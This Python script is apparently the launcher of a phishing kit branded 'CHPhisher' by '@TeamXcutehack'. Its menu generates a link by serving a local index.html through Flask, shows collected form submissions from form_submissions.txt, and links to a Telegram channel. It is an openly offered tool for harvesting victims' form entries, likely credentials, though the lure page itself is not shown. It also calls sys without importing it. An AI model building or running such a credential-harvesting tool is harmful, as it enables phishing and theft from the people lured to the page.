import os
import subprocess
import time
import webbrowser

def check_and_install_modules():
    modules = ['flask']  # Add any other required modules here
    for module in modules:
        try:
            __import__(module)
        except ImportError:
            print(f"Module {module} not found. Installing...")
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', module])
    print("All required modules are installed.")

def start_loading_animation():
    print("Loading", end="")
    for _ in range(3):
        time.sleep(1)
        print(".", end="", flush=True)
    print()

def host_html_file():
    from flask import Flask, send_from_directory

    app = Flask(__name__)

    @app.route('/')
    def serve_html():
        return send_from_directory('.', 'index.html')

    @app.route('/form_submissions')
    def serve_txt():
        return send_from_directory('.', 'form_submissions.txt')

    app.run(port=5000)

def main_menu():
    print(" ╔═══╦╗─╔═══╦╗─────╔╗")
    print("║╔═╗║║─║╔═╗║║─────║║")
    print("║║─╚╣╚═╣╚═╝║╚═╦╦══╣╚═╦══╦═╗")
    print("║║─╔╣╔╗║╔══╣╔╗╠╣══╣╔╗║║═╣╔╝")
    print("║╚═╝║║║║║──║║║║╠══║║║║║═╣║")
    print("╚═══╩╝╚╩╝──╚╝╚╩╩══╩╝╚╩══╩╝")
    print("-----------------------------------provides By @TeamXcutehack--------devloper-@cutehack99yt--------")
    print("01. Generate the link.")
    print("02. Get the detail.")
    print("03. Developer")

    choice = input("Enter your choice (1/2/3): ")
    if choice == '1':
        print("Starting local server to host HTML file...")
        host_html_file()
    elif choice == '2':
        print("Opening form_submissions.txt in nano editor...")
        os.system('nano form_submissions.txt')
    elif choice == '3':
        print("Opening Telegram channel...")
        webbrowser.open('https://t.me/teamXcutehack')
    else:
        print("Invalid choice. Exiting.")

if __name__ == "__main__":
    start_loading_animation()
    check_and_install_modules()
    main_menu()
